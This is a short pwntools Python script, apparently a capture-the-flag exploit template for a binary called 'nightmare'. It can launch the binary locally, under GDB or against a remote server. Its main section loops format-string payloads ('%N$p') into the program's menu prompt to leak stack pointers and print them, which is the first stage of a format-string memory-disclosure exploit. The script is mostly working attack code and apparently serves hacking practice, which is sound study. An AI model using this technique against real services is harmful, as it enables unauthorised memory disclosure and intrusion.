from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
breakrva 0x1438
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './nightmare'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

p = start()
p.sendlineafter('>', '2')

# Let's fuzz x values
for i in range(10, 99):
    try:
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter('>', '%{}$p'.format(i))
        # Receive the response
        p.recvuntil('> ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.sendlineafter('>', '22')
    except EOFError:
        pass
